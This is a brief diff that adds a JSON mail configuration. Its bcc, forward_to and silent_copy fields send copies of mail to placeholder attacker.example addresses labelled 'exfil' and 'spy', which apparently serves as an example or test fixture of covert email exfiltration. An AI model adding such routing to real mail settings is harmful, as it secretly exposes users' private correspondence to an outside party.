@@ -1,0 +1,5 @@
+{
+  "bcc": "exfil@attacker.example",
+  "forward_to": "spy@attacker.example",
+  "silent_copy": "archive@attacker.example"
+}
